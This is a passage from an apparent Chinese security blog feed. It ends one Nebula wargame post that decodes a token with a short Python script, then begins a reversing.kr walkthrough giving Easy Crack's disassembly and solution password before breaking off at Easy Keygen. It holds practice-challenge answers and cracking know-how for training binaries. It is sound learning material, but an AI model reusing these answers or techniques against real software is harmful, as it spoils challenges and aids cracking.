&lt;span class="n"&gt;encrypt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()[:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;plain&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
   &lt;span class="n"&gt;plain&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;plain&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;最后得到token：8457c118-887c-4e40-a5a6-33a25353165。&lt;/p&gt;</content><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>reversing.kr四道Easy题解题攻略</title><link href="http://blog.yyx.me/posts/reversing-kr-4-easy-challenges.html" rel="alternate"></link><published>2014-09-10T23:51:00-07:00</published><updated>2014-09-10T23:51:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2014-09-10:/posts/reversing-kr-4-easy-challenges.html</id><summary type="html">&lt;p&gt;本文为逆向工程练习网站reversing.kr中Easy Crack、Easy Keygen、Easy Unpack及Easy ELF的解题攻略。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;开篇废话&lt;/h1&gt;
&lt;p&gt;Nebula的level11做的有点头大，这时大神Jack又发来了逆向的题目，让我赶紧练练。虽然我负责比赛中逆向类的题目，但逆向题一般都比较难，先放出来的题基本都是其他类别，所以我就彻底成了打（跑）辅（龙）助（套）的角色~~~&lt;/p&gt;
&lt;p&gt;这次这套题目来自&lt;a href="http://reversing.kr/"&gt;reversing.kr&lt;/a&gt;，棒子的逆向挑战网站。话说棒子的Hacking能力还是挺强的，据说是个什么棒子的优选计划搞出来的成果。&lt;/p&gt;
&lt;p&gt;本篇就记录一下4道名称是Easy开头题目，分别是Easy Crack、Easy Keygen、Easy Unpack和Easy ELF。这四题难度非常低，熟练地话掌握好节奏感可以蹭蹭蹭的秒题……&lt;/p&gt;
&lt;h1&gt;Easy Crack&lt;/h1&gt;
&lt;p&gt;程序启动后输入任意字符会显示一个MessageBox的Incorrect Password。打开OllyDbg，载入程序后查找到目标字符串Incorrect Password，之后转到程序，字符串前后代码如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;00401080&lt;/span&gt;  &lt;span class="o"&gt;/$&lt;/span&gt;  &lt;span class="nt"&gt;83EC&lt;/span&gt; &lt;span class="nt"&gt;64&lt;/span&gt;       &lt;span class="nt"&gt;sub&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;64&lt;/span&gt;
&lt;span class="nt"&gt;00401083&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;57&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;
&lt;span class="nt"&gt;00401084&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;B9&lt;/span&gt; &lt;span class="nt"&gt;18000000&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;18&lt;/span&gt;
&lt;span class="nt"&gt;00401089&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33C0&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;0040108B&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D7C24&lt;/span&gt; &lt;span class="nt"&gt;05&lt;/span&gt;     &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;0040108F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;C64424&lt;/span&gt; &lt;span class="nt"&gt;04&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;  &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;
&lt;span class="nt"&gt;00401094&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;64&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;64&lt;/span&gt;                                  &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;Count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;64&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;100&lt;/span&gt;&lt;span class="o"&gt;.)&lt;/span&gt;
&lt;span class="nt"&gt;00401096&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;F3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;AB&lt;/span&gt;         &lt;span class="nt"&gt;rep&lt;/span&gt; &lt;span class="nt"&gt;stos&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;              &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;00401098&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;66&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;AB&lt;/span&gt;         &lt;span class="nt"&gt;stos&lt;/span&gt; &lt;span class="nt"&gt;word&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;0040109A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;AA&lt;/span&gt;            &lt;span class="nt"&gt;stos&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;0040109B&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B7C24&lt;/span&gt; &lt;span class="nt"&gt;70&lt;/span&gt;     &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;70&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;            &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;0040109F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D4424&lt;/span&gt; &lt;span class="nt"&gt;08&lt;/span&gt;     &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;             &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="nt"&gt;004010A3&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;Buffer&lt;/span&gt;
&lt;span class="nt"&gt;004010A4&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;E8030000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;3E8&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;ControlID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;3E8&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;1000&lt;/span&gt;&lt;span class="o"&gt;.)&lt;/span&gt;
&lt;span class="nt"&gt;004010A9&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;57&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;hWnd&lt;/span&gt;
&lt;span class="nt"&gt;004010AA&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;9C504000&lt;/span&gt; &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;USER32.GetDlgItemTe&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nx"&gt;GetDlgItemTextA&lt;/span&gt;

&lt;span class="nx"&gt;...&lt;/span&gt;

&lt;span class="mi"&gt;00401114&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nx"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;40&lt;/span&gt;         &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;40&lt;/span&gt;                                  &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;Style&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;MB_OK&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;MB_ICONASTERISK&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;MB_APPLMODAL&lt;/span&gt;
&lt;span class="mi"&gt;00401116&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="mi"&gt;58604000&lt;/span&gt;   &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="nx"&gt;Easy_Cra.00406058&lt;/span&gt;                   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;EasyCrackMe&lt;/span&gt;
&lt;span class="mi"&gt;0040111&lt;/span&gt;&lt;span class="nx"&gt;B&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="mi"&gt;44604000&lt;/span&gt;   &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="nx"&gt;Easy_Cra.00406044&lt;/span&gt;                   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;Congratulation&lt;/span&gt; &lt;span class="o"&gt;!!&lt;/span&gt;
&lt;span class="mi"&gt;00401120&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;57&lt;/span&gt;            &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="nx"&gt;edi&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;hOwner&lt;/span&gt;
&lt;span class="mi"&gt;00401121&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="bp"&gt;.  &lt;/span&gt;&lt;span class="nx nx-Member"&gt;FF15&lt;/span&gt; &lt;span class="nx"&gt;A0504000&lt;/span&gt; &lt;span class="nx"&gt;call&lt;/span&gt; &lt;span class="nx"&gt;dword&lt;/span&gt; &lt;span class="nx"&gt;ptr&lt;/span&gt; &lt;span class="nx"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;USER32.MessageBoxA&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nx"&gt;MessageBoxA&lt;/span&gt;
&lt;span class="mi"&gt;00401127&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nx"&gt;A&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;         &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;                                   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;Result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="mi"&gt;00401129&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;57&lt;/span&gt;            &lt;span class="nx"&gt;push&lt;/span&gt; &lt;span class="nx"&gt;edi&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;hWnd&lt;/span&gt;
&lt;span class="mi"&gt;0040112&lt;/span&gt;&lt;span class="nx"&gt;A&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="bp"&gt;.  &lt;/span&gt;&lt;span class="nx nx-Member"&gt;FF15&lt;/span&gt; &lt;span class="nx"&gt;A4504000&lt;/span&gt; &lt;span class="nx"&gt;call&lt;/span&gt; &lt;span class="nx"&gt;dword&lt;/span&gt; &lt;span class="nx"&gt;ptr&lt;/span&gt; &lt;span class="nx"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;USER32.EndDialog&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;  &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;EndDialog&lt;/span&gt;
&lt;span class="nt"&gt;00401130&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;5F&lt;/span&gt;            &lt;span class="nt"&gt;pop&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;
&lt;span class="nt"&gt;00401131&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;83C4&lt;/span&gt; &lt;span class="nt"&gt;64&lt;/span&gt;       &lt;span class="nt"&gt;add&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;64&lt;/span&gt;
&lt;span class="nt"&gt;00401134&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;C3&lt;/span&gt;            &lt;span class="nt"&gt;retn&lt;/span&gt;
&lt;span class="nt"&gt;00401135&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;                                  &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;Style&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;MB_OK&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;MB_ICONHAND&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;MB_APPLMODAL&lt;/span&gt;
&lt;span class="nt"&gt;00401137&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;58604000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Cra&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00406058&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;EasyCrackMe&lt;/span&gt;
&lt;span class="nt"&gt;0040113C&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;30604000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Cra&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00406030&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;Incorrect&lt;/span&gt; &lt;span class="nt"&gt;Password&lt;/span&gt;
&lt;span class="nt"&gt;00401141&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;57&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;hOwner&lt;/span&gt;
&lt;span class="nt"&gt;00401142&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;A0504000&lt;/span&gt; &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;USER32.MessageBoxA&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nx"&gt;MessageBoxA&lt;/span&gt;
&lt;span class="mi"&gt;00401148&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nx"&gt;F&lt;/span&gt;            &lt;span class="nx"&gt;pop&lt;/span&gt; &lt;span class="nx"&gt;edi&lt;/span&gt;
&lt;span class="mi"&gt;00401149&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;83&lt;/span&gt;&lt;span class="nx"&gt;C4&lt;/span&gt; &lt;span class="mi"&gt;64&lt;/span&gt;       &lt;span class="nx"&gt;add&lt;/span&gt; &lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;
&lt;span class="mi"&gt;0040114&lt;/span&gt;&lt;span class="nx"&gt;C&lt;/span&gt;  &lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="bp"&gt;.  &lt;/span&gt;&lt;span class="nx nx-Member"&gt;C3&lt;/span&gt;            &lt;span class="nx"&gt;retn&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;程序通过GetDlgItemTextA获取输入字符串，之后经过一段算法判定对错。下面分析算法：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;004010B0  |.  807C24 05 61  cmp byte ptr ss:[esp+5],61
004010B5  |.  75 7E         jnz short Easy_Cra.00401135
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;首先确定esp+5位置字符为0x61，即a。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;004010B7  |.  6A 02         push 2
004010B9  |.  8D4C24 0A     lea ecx,dword ptr ss:[esp+A]
004010BD  |.  68 78604000   push Easy_Cra.00406078                   ;  5y
004010C2  |.  51            push ecx
004010C3  |.  E8 88000000   call Easy_Cra.00401150                   ;  strcmp
004010C8  |.  83C4 0C       add esp,0C
004010CB  |.  85C0          test eax,eax
004010CD  |.  75 66         jnz short Easy_Cra.00401135
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后判断esp+A处字符串是否为5y。 这里由于&lt;code&gt;push 2&lt;/code&gt;指令，栈针会上移4byte，因此此时esp=esp-4，所以现在的esp+A相当于上一次的esp-4+A（esp+6），这样就和上一次esp+5成为连续的字符串，也就是3个连续的字符为a5y。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;004010CF  |.  53            push ebx
004010D0  |.  56            push esi
004010D1  |.  BE 6C604000   mov esi,Easy_Cra.0040606C                ;  R3versing
004010D6  |.  8D4424 10     lea eax,dword ptr ss:[esp+10]
004010DA  |&amp;gt;  8A10          /mov dl,byte ptr ds:[eax]
004010DC  |.  8A1E          |mov bl,byte ptr ds:[esi]
004010DE  |.  8ACA          |mov cl,dl
004010E0  |.  3AD3          |cmp dl,bl
004010E2  |.  75 1E         |jnz short Easy_Cra.00401102
004010E4  |.  84C9          |test cl,cl
004010E6  |.  74 16         |je short Easy_Cra.004010FE
004010E8  |.  8A50 01       |mov dl,byte ptr ds:[eax+1]
004010EB  |.  8A5E 01       |mov bl,byte ptr ds:[esi+1]
004010EE  |.  8ACA          |mov cl,dl
004010F0  |.  3AD3          |cmp dl,bl
004010F2  |.  75 0E         |jnz short Easy_Cra.00401102
004010F4  |.  83C0 02       |add eax,2
004010F7  |.  83C6 02       |add esi,2
004010FA  |.  84C9          |test cl,cl
004010FC  |.^ 75 DC         \jnz short Easy_Cra.004010DA
004010FE  |&amp;gt;  33C0          xor eax,eax
00401100  |.  EB 05         jmp short Easy_Cra.00401107
00401102  |&amp;gt;  1BC0          sbb eax,eax
00401104  |.  83D8 FF       sbb eax,-1
00401107  |&amp;gt;  5E            pop esi
00401108  |.  5B            pop ebx
00401109  |.  85C0          test eax,eax
0040110B  |.  75 28         jnz short Easy_Cra.00401135
0040110D  |.  807C24 04 45  cmp byte ptr ss:[esp+4],45
00401112  |.  75 21         jnz short Easy_Cra.00401135
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后匹配字符串R3versing，并在字符串头部（esp+4处）添加字符为E。因此答案为Ea5yR3versing。&lt;/p&gt;
&lt;p&gt;这里算法由于涉及到esp的改变，因此OD跟踪起来比IDA静态分析更加简单。可以直接将程序跑起来，当程序碰到相关判断的地方（一般是cmp）会改变标志位（一般是ZF），只需要改变标志位寄存器的值让它按照你要的逻辑执行下去即可，当然你需要同时记录这些让逻辑保持正确的字符，你可以直接在栈（或数据区）中作出修改。之后当程序跑完之后，你的栈（或数据区）中就是一个正确的值。本程序栈的结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img alt="OD" src="../statics/reversing-kr-4-easy-challenges/2014-09-13_234947.jpg"&gt;&lt;/p&gt;
&lt;h1&gt;Easy Keygen&lt;/h1&gt;
&lt;p&gt;注册机题，readme要求Find the Name when the Serial is 5B134977135E7D13。程序跑起来，要求输入名字和序列号，测试了一下Name为abcde和随机的序列号，提示错误：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;C:\Users\GreatYYX&amp;gt;&amp;quot;F:\Crack\reversingkr\Easy_KeygenMe\Easy Keygen.exe&amp;quot;

Input Name: abcde
Input Serial: 12345
Wrong
&lt;/pre&gt;&lt;/div&gt;


